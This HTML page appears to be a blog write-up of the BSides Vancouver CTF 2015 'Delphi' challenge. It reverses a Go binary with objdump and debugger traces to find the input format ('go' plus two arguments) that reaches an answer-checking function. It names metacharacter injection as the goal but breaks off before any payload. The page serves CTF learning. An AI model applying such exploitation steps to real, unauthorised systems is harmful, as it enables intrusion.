<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Bsides Vancouver CTF 2015 - Delphi</title>
  <meta name="description" content="files given:">

  <link href='https://fonts.googleapis.com/css?family=Open+Sans:600,700|Droid+Serif:400,700' rel='stylesheet' type='text/css'>
  
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/ctf/format-string/2015/04/04/bsides-vancouver/">
  <link rel="alternate" type="application/rss+xml" title="See you, %20 cowboy" href="http://localhost:4000/feed.xml">

  <link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
</head>


  <body>
    <div class="site-wrap">
      <header class="site-header">
  <div class="wrapper">
    <a class="site-title" href="http://localhost:4000/">See you, %20 cowboy</a>
    <span class="site-description">A most excellent adventure in hacking</span>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        

        <a href="/feed.xml" class="page-link">RSS</a>
      </div>
    </nav>
  </div>
</header>


      <div class="page-content">
        <div class="wrapper">
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Bsides Vancouver CTF 2015 - Delphi</h1>
    <p class="post-meta"><time datetime="2015-04-04T05:00:00-07:00" itemprop="datePublished">April 04, 2015</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>files given:</p>

<ul>
  <li>delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b</li>
  <li>libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2</li>
</ul>

<p>TL;DR</p>

<ul>
  <li>Reverse Command Protocol</li>
  <li>Integer Overflow</li>
  <li>Metacharacter Injection</li>
</ul>

<p>First we identify what type of binary we are dealing with:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  file delphi
delphi: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>0x936b88708739382f1d376e89a4b82a4248d19b08, not stripped</code></pre></figure>

<p>Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  objdump <span class="nt">-t</span> delphi | <span class="nb">grep </span>go
0000000000506920 l    d  .gopclntab	0000000000000000              .gopclntab
0000000000754ff0 l    d  .got	0000000000000000              .got
0000000000755000 l    d  .got.plt	0000000000000000              .got.plt
0000000000000000 l    df <span class="k">*</span>ABS<span class="k">*</span>	0000000000000000              _cgo_export.c
0000000000000000 l    df <span class="k">*</span>ABS<span class="k">*</span>	0000000000000000              main.cgo2.c
0000000000000000 l    df <span class="k">*</span>ABS<span class="k">*</span>	0000000000000000              _cgo_export.c
0000000000000000 l    df <span class="k">*</span>ABS<span class="k">*</span>	0000000000000000              cgo.cgo2.c
0000000000000000 l    df <span class="k">*</span>ABS<span class="k">*</span>	0000000000000000              /var/tmp/go-link-Sk9whB/go.o
00000000004f5138 l     O .rodata	0000000000000000              go.func.<span class="k">*</span>
00000000004d37c0 l     O .rodata	0000000000000000              go.string.<span class="k">*</span>
...</code></pre></figure>

<p>Now we have to make sure our system finds the libtwenty.so object file (just add the directory where you have libtwenty.so to the <code class="highlighter-rouge">LD_LIBRARY_PATH</code> environment variable):</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  <span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span></code></pre></figure>

<p>So when we run this program, we are prompted with:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
<span class="o">&gt;</span></code></pre></figure>

<p>OK, so we have a place to input data… let’s first look for a place we can latch onto:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">➜</span>  <span class="n">yvr</span>  <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="n">delphi</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">main</span>
<span class="mi">0000000000000000</span> <span class="n">l</span>    <span class="n">df</span> <span class="o">*</span><span class="n">ABS</span><span class="o">*</span>	<span class="mi">0000000000000000</span>              <span class="n">main</span><span class="p">.</span><span class="n">cgo2</span><span class="p">.</span><span class="n">c</span>
<span class="mi">0000000000504</span><span class="n">ff8</span> <span class="n">l</span>     <span class="n">O</span> <span class="p">.</span><span class="n">rodata</span>	<span class="mi">0000000000000008</span>              <span class="n">runtime</span><span class="p">.</span><span class="n">main</span><span class="p">.</span><span class="n">f</span>
<span class="mi">00000000005050</span><span class="n">d0</span> <span class="n">l</span>     <span class="n">O</span> <span class="p">.</span><span class="n">rodata</span>	<span class="mi">0000000000000010</span>              <span class="n">go</span><span class="p">.</span><span class="n">importpath</span><span class="p">.</span><span class="n">main</span><span class="p">.</span>
<span class="mi">000000000076</span><span class="n">d164</span> <span class="n">l</span>     <span class="n">O</span> <span class="p">.</span><span class="n">noptrbss</span>	<span class="mi">0000000000000001</span>              <span class="n">main</span><span class="p">.</span><span class="n">initdone</span><span class="p">.</span>
<span class="mi">0000000000505</span><span class="n">ae0</span> <span class="n">l</span>     <span class="n">O</span> <span class="p">.</span><span class="n">rodata</span>	<span class="mi">0000000000000060</span>              <span class="n">main</span><span class="p">.</span><span class="n">statictmp_0021</span>
<span class="mi">0000000000401280</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">00000000000009</span><span class="n">b0</span>              <span class="n">main</span><span class="p">.</span><span class="n">main</span>
<span class="mi">0000000000401</span><span class="n">c30</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">00000000000001</span><span class="n">c0</span>              <span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span>
<span class="mi">0000000000401</span><span class="n">df0</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000070</span>              <span class="n">main</span><span class="p">.</span><span class="n">init</span>
<span class="mi">00000000004021</span><span class="n">c0</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000070</span>              <span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_CString</span>
<span class="mi">0000000000402230</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000040</span>              <span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_check_answer</span>
<span class="mi">0000000000402270</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000040</span>              <span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_free</span>
<span class="mi">0000000000411</span><span class="n">b20</span> <span class="n">l</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000170</span>              <span class="n">runtime</span><span class="p">.</span><span class="n">main</span>
<span class="mi">0000000000000000</span>       <span class="n">F</span> <span class="o">*</span><span class="n">UND</span><span class="o">*</span>	<span class="mi">0000000000000000</span>              <span class="n">__libc_start_main</span><span class="err">@@</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span>
<span class="mi">00000000004295</span><span class="n">b0</span> <span class="n">g</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>	<span class="mi">0000000000000010</span>              <span class="n">main</span></code></pre></figure>

<p>Alright so we found main (really main.main, since this is a Golang program), and we also found a function “main.doTheMagic”, interesting… let’s try to see if we can get there.</p>

<p>We first find where our input is being read in:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x401747</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1223</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
   <span class="mh">0x40174c</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1228</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="err">]</span>
   <span class="mh">0x401751</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1233</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rsp],</span><span class="n">rbx</span>
<span class="o">=&gt;</span> <span class="mh">0x401755</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1237</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x42cf70</span> <span class="o">&lt;</span><span class="n">bufio</span><span class="p">.(</span><span class="o">*</span><span class="n">Scanner</span><span class="p">).</span><span class="n">Scan</span><span class="o">&gt;</span>
   <span class="mh">0x40175a</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1242</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">rbx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
   <span class="mh">0x401760</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1248</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">bl</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x401763</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1251</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x4018b1</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1585</span><span class="o">&gt;</span>
   <span class="mh">0x401769</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1257</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="err">]</span></code></pre></figure>

<p>If we continue to step (Whenever I debug, I can’t help but think about Vampire Weekend’s Step, naturally that is on a loop when I’m doing this :D), we end up here:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="err">]</span>
<span class="n">RAX</span><span class="o">:</span> <span class="mh">0x2</span> 
<span class="n">RBX</span><span class="o">:</span> <span class="mh">0x4d7f60</span> <span class="o">--&gt;</span> <span class="mh">0x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="err">'</span><span class="n">go</span><span class="err">'</span><span class="p">)</span>
<span class="n">RDX</span><span class="o">:</span> <span class="mh">0xa</span> <span class="p">(</span><span class="sc">'\n'</span><span class="p">)</span>
<span class="n">RSI</span><span class="o">:</span> <span class="mh">0x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="err">'</span><span class="n">go</span><span class="err">'</span><span class="p">)</span>
<span class="n">RDI</span><span class="o">:</span> <span class="mh">0xc208000270</span> <span class="p">(</span><span class="s">"TEST INPUT"</span><span class="p">)</span>
<span class="err">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="err">]</span>
   <span class="mh">0x401939</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1721</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbx</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
   <span class="mh">0x40193d</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1725</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x90</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
   <span class="mh">0x401945</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1733</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0xb0</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
<span class="o">=&gt;</span> <span class="mh">0x40194d</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1741</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">rax</span>                     <span class="c">; Compares the length of "go" to our input</span>
   <span class="mh">0x401950</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1744</span><span class="o">&gt;:</span>	<span class="k">jl</span>     <span class="mh">0x401baa</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">2346</span><span class="o">&gt;</span>   <span class="c">; Go somewhere else if our input's length is &lt; 2</span>
   <span class="mh">0x401956</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1750</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">rax</span>                     
   <span class="mh">0x401959</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1753</span><span class="o">&gt;:</span>	<span class="k">jb</span>     <span class="mh">0x401bb2</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">2354</span><span class="o">&gt;</span>    
   <span class="mh">0x40195f</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1759</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0xb8</span><span class="err">]</span><span class="p">,</span><span class="n">rdi</span></code></pre></figure>

<p>Alright, so it compares the length of our input to 2 and if it is smaller then it will presumablely quit.</p>

<p>Moving forward…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="err">]</span>
<span class="n">RAX</span><span class="o">:</span> <span class="mh">0x2</span> 
<span class="n">RSI</span><span class="o">:</span> <span class="mh">0x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="err">'</span><span class="n">go</span><span class="err">'</span><span class="p">)</span>
<span class="n">RDI</span><span class="o">:</span> <span class="mh">0xc208000270</span> <span class="p">(</span><span class="s">"TEST INPUT"</span><span class="p">)</span>
<span class="err">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="err">]</span>
   <span class="mh">0x40197c</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1788</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
   <span class="mh">0x401981</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1793</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x10</span><span class="err">]</span><span class="p">,</span><span class="n">rsi</span>
   <span class="mh">0x401986</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1798</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
<span class="o">=&gt;</span> <span class="mh">0x40198b</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1803</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x425600</span> <span class="o">&lt;</span><span class="n">runtime</span><span class="p">.</span><span class="n">eqstring</span><span class="o">&gt;</span>
   <span class="mh">0x401990</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1808</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">rbx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span>
   <span class="mh">0x401996</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1814</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">bl</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x401999</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1817</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x401baa</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">2346</span><span class="o">&gt;</span>
   <span class="mh">0x40199f</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1823</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x1</span></code></pre></figure>

<p>So it looks like the program checks to make sure the first two characters of the string are “go”, so let’s give that a try to see if anything different happens:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">➜  yvr  ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
Im thinking of something big, metal, and orange. Go!
<span class="o">&gt;</span> go
Sneaky, sneaky. Go where? How fast?
<span class="o">&gt;</span> something <span class="k">else
</span>Whos that?
<span class="o">&gt;</span> asdfasdf
Whos that?
<span class="o">&gt;</span> asdfasdfasd
Maybe? Hmmm.
<span class="o">&gt;</span> </code></pre></figure>

<p>So “go” is definetly what we want for the first part of our payload.</p>

<p>Let’s see where this takes us now…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x401a04</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1924</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rsp],</span><span class="n">rcx</span>
   <span class="mh">0x401a08</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1928</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x70</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
   <span class="mh">0x401a0d</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1933</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
<span class="o">=&gt;</span> <span class="mh">0x401a12</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1938</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x401c30</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">&gt;</span>
   <span class="mh">0x401a17</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1943</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">ds</span><span class="o">:</span><span class="mh">0x4d4060</span>
   <span class="mh">0x401a1f</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1951</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rbx]</span>
   <span class="mh">0x401a22</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1954</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0xd8</span><span class="err">]</span><span class="p">,</span><span class="n">rbp</span>
   <span class="mh">0x401a2a</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">main</span><span class="o">+</span><span class="mi">1962</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbx</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span></code></pre></figure>

<p>Sweet :D, we can get to the magic function now…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x401c77</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rbp</span>
   <span class="mh">0x401c7a</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;:</span>	<span class="n">movs</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[rdi],</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="p">[rsi]</span>
   <span class="mh">0x401c7c</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>	<span class="n">movs</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[rdi],</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="p">[rsi]</span>
<span class="o">=&gt;</span> <span class="mh">0x401c7e</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x44a480</span> <span class="o">&lt;</span><span class="n">strings</span><span class="p">.</span><span class="n">Split</span><span class="o">&gt;</span>
   <span class="mh">0x401c83</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span>
   <span class="mh">0x401c88</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x28</span><span class="err">]</span>
   <span class="mh">0x401c8d</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x30</span><span class="err">]</span>
   <span class="mh">0x401c92</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x68</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
<span class="n">Guessed</span> <span class="n">arguments</span><span class="o">:</span>
<span class="n">arg</span><span class="p">[0]</span><span class="o">:</span> <span class="mh">0x7ffff7e26d40</span> <span class="o">--&gt;</span> <span class="mh">0x8</span> 
<span class="n">arg</span><span class="p">[1]</span><span class="o">:</span> <span class="mh">0x4d37d0</span> <span class="o">--&gt;</span> <span class="mh">0x20</span> <span class="p">(</span><span class="sc">' '</span><span class="p">)</span></code></pre></figure>

<p>So it looks like our input is being split on spaces. We need to see how many parameters this thing expects…</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x0000000000401ca1</span> <span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x1</span>
   <span class="mh">0x0000000000401ca5</span> <span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x401d57</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">295</span><span class="o">&gt;</span>
   <span class="p">...</span>
   <span class="mh">0x0000000000401d57</span> <span class="o">&lt;+</span><span class="mi">295</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x3</span>
   <span class="mh">0x0000000000401d5b</span> <span class="o">&lt;+</span><span class="mi">299</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x401dd2</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">doTheMagic</span><span class="o">+</span><span class="mi">418</span><span class="o">&gt;</span>
   <span class="p">...</span></code></pre></figure>

<p>If you take into consideration the control flow going on here, and taking a peak at the bottom of our magic function:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x0000000000401dbf</span> <span class="o">&lt;+</span><span class="mi">399</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x402230</span> <span class="o">&lt;</span><span class="n">main</span><span class="p">.</span><span class="n">_Cfunc_check_answer</span><span class="o">&gt;</span></code></pre></figure>

<p>It seems to me we want to go into that function and in order to do that we would have to have <code class="highlighter-rouge">rax == 3</code>. Since we know the value in rax is controlled by our split function’s return value, we are going to have 3 parameters in our payload, one of them being “go”. Thus, it will look something like this:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">go &lt;something&gt; &lt;something&gt;</code></pre></figure>

<p>Alright, so let’s checkout the check answer function:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">   <span class="mh">0x0000000000402230</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">fs</span><span class="o">:</span><span class="mh">0xfffffffffffffff0</span>
